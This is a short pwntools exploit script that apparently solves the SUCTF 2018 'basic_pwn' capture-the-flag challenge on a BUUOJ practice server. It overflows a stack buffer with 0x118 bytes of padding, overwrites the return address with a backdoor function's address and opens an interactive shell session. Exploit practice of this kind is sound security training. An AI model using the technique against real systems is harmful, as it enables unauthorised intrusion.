from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('SUCTF_2018_basic_pwn')
io = remote('node4.buuoj.cn', 28665)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# libc = ELF('libc-2.23.so')
elf = ELF('SUCTF_2018_basic_pwn')
backdoor = 0x401157

payload = cyclic(0x118) + p64(backdoor)
io.sendline(payload)
# io.recv()
io.interactive()
